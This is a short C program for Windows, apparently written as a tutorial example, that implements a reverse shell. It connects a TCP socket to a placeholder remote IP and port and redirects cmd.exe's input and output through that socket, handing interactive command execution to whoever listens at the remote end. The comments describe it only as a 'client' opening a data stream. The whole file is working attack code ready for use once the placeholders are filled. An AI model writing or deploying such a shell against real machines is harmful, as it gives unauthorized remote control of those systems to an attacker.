#include <windows.h>
#include <stdio.h>
#include <winsock2.h>

// this program is the client. It initiates an outgoing connexion. The IP address is that of the distant host. 
// If the connexion succeeds, a bi-directional stream is opened and the two machines can now exchange data. 

WSADATA wsaData;
SOCKET windowSock;

// structure IPV4 (addresse + port)
struct sockaddr_in sockAddr;
int port = <target-port>;
char *ip = "<target-ip>";

STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;

int main(int argc, char *argv[]){
  int start = WSAStartup(MAKEWORD(2,2), &wsaData);
  // socket creation
  windowSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // creates a socket

  // configuring distant address. The address of the machine we want to connect to.
  sockAddr.sin_family = AF_INET;
  sockAddr.sin_addr.s_addr = inet_addr(ip);
  sockAddr.sin_port = htons(port);

  // establishing TCP connection to target address. 
  WSAConnect(windowSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

  memset(&sinfo, 0, sizeof(sinfo)); // filling all the sinfo struct with zeros
  sinfo.cb = sizeof(sinfo);
  sinfo.dwFlags = STARTF_USESTDHANDLES;
  sinfo.hStdError  = (HANDLE)windowSock;
  sinfo.hStdInput  = (HANDLE)windowSock;
  sinfo.hStdOutput = (HANDLE)windowSock;

  CreateProcessA(NULL, "cmd.exe", NULL, NULL,TRUE , 0, NULL, NULL, &sinfo, &pinfo);

  return 0;
}